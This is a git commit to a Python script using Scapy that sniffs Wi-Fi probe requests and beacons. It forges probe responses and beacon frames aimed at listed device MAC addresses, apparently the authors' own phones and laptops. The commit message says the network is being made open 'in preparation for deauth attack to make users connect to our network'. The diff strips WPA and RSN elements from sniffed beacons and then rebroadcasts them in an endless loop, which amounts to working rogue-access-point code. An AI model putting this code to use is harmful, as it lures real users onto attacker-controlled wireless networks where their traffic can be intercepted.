57e0febb1319492cae946f69234145209a238db2
Shaked Nissanov <shaked.nissanov@gmail.com>
2021-05-12 01:30:06 +0300

    Made the packets feel more real
    By sniffing and getting a packet, we were able to get a more real looking beacon and probe response.
    Changed the wifi network shown in the client to be not password protected, in preparation for deauth attack to make users connect to our network.

--- probeResponder.py
+++ probeResponder.py
@@ -6,36 +6,30 @@ import sys
 
 monitor = "wlan0"
 injector = "wlan0"
-#target = "6C:C7:EC:BA:E9:22" # Shaked's phone
+target = "6C:C7:EC:BA:E9:22" # Shaked's phone
 #target = "8C:83:E1:F4:16:EC" # Shaked's tablet
 #target = "DC:0C:5C:B0:D7:36" # Ella's phone
-target = "44:85:00:1C:3A:0E" # Ella's laptop
+#target = "44:85:00:1C:3A:0E" # Ella's laptop
 source = "00:0c:29:52:66:4e"
-	
-def getEssid(pkt): 
-	dot11elt = pkt.getlayer(Dot11Elt)
-	while dot11elt:
-		if(dot11elt.ID == 0):
-			return dot11elt.info
-		dot11elt = dot11elt.payload.getlayer(Dot11Elt)
-	return ''
-
-def setEssid(pkt, essid):
-	dot11elt = pkt.getlayer(Dot11Elt)
-	while dot11elt:
-		if(dot11elt.ID == 0):
-			dot11elt.info = essid
-			dot11elt.len = len(dot11elt.info)
-		dot11elt = dot11elt.payload.getlayer(Dot11Elt)
-
-def fuzzProbeResponse(pkt):
+		
+def removeEltLayer(pkt, ID):
 	layer = pkt.getlayer(Dot11Elt)
 	while layer:
-			if(layer.ID == 0):
-				layer.remove_payload() # TODO : maybe change to adding the ssid layer to the end instead of making it the end
-				layer.info = 'TEST AP'  # length < 1495 : visible, length >= 1495 : not visible
-				layer.len = len(layer.info) # limited up to 255 (maybe due to Scapy's rules)
-			layer = layer.payload.getlayer(Dot11Elt)
+		if(layer.ID == ID):
+			afterLayer = layer.payload
+			layer.underlayer.remove_payload()
+			pkt = pkt / afterLayer
+			break
+		layer = layer.payload.getlayer(Dot11Elt)
+	return pkt
+
+def fuzzProbeResponse(pkt):
+	name = 'TEST AP'
+	length = 7
+	pkt = removeEltLayer(pkt, 0)
+	pkt = pkt / Dot11Elt(ID = 0, len = length, info = name)
+	return pkt
+		
 
 def craftProbeResponse(pkt):
 	afterRequestLayer = pkt.getlayer(Dot11ProbeReq).payload
@@ -47,16 +41,6 @@ def craftProbeResponse(pkt):
 	apAddress = pkt.getlayer(Dot11).addr1
 	pkt.getlayer(Dot11).addr1, pkt.getlayer(Dot11).addr2, pkt.getlayer(Dot11).addr3 = clientAddress, source, source
 	return pkt
-
-def fuzzBeacon(pkt):
-	x = 0
-
-def craftBeacon():
-	name = 'TEST AP'
-	pkt = RadioTap() / Dot11(type = 0, subtype = 8, addr1 = target, addr2 = source, addr3 = source) \
-		/Dot11Beacon(cap = 0x1100) \
-		/Dot11Elt(ID = 0, len = len(name), info = name)
-	return pkt
 	
 def handleProbeResponse(pkt):
 	if pkt.haslayer(Dot11ProbeReq) and pkt.haslayer(Dot11EltDSSSet) and pkt.haslayer(Dot11EltRates, 2):
@@ -64,23 +48,52 @@ def handleProbeResponse(pkt):
 			return
 		print('got probe request from the target, crafting a probe response.')
 		resp = craftProbeResponse(pkt) 
-		for i in range(100000):
-			fuzzProbeResponse(resp)
+		for i in range(1):
+			resp = fuzzProbeResponse(resp)
 			sendp(resp, iface = injector, verbose = False)
-
-def sendBeacon():
-	beacon = craftBeacon() 
-	fuzzBeacon(beacon)
-	sendp(beacon, iface = injector, verbose = False)
-				
+			
 def probeAttack():
 	sniff(iface = monitor, prn = handleProbeResponse)
 	while 1:
 		time.sleep(1)
 
+def fuzzBeacon(pkt):
+	name = 'TEST AP'
+	length = 7
+	pkt = removeEltLayer(pkt, 0)
+	
+	layer = pkt.getlayer(Dot11EltMicrosoftWPA)
+	afterLayer = layer.payload
+	layer.underlayer.remove_payload()
+	pkt = pkt / afterLayer
+	
+	layer = pkt.getlayer(Dot11EltRSN)
+	afterLayer = layer.payload
+	layer.underlayer.remove_payload()
+	pkt = pkt / afterLayer
+	
+	pkt.getlayer(Dot11Beacon).cap = 0x0100
+	pkt = pkt / Dot11Elt(ID = 0, len = length, info = name)
+	pkt.getlayer(Dot11).addr2, pkt.getlayer(Dot11).addr3 = source, source 
+	return pkt
+
+beacon = None
 def beaconAttack():
+	global beacon
+	def stopFilter(pkt):
+		global beacon
+		if(pkt.haslayer(Dot11Beacon)):
+			print("Sniffed a beacon frame")
+			beacon = pkt
+			return True
+		return False
+		
+	sniff(iface = monitor, stop_filter = stopFilter)
+	while(beacon == None):
+		time.sleep(0.1)
+	beacon = fuzzBeacon(beacon)
 	while 1:
-		sendBeacon()
+		sendp(beacon, iface = injector, verbose = False)
 		
 if __name__ == '__main__':
 	print('\n' + 'Attacker Initialized')
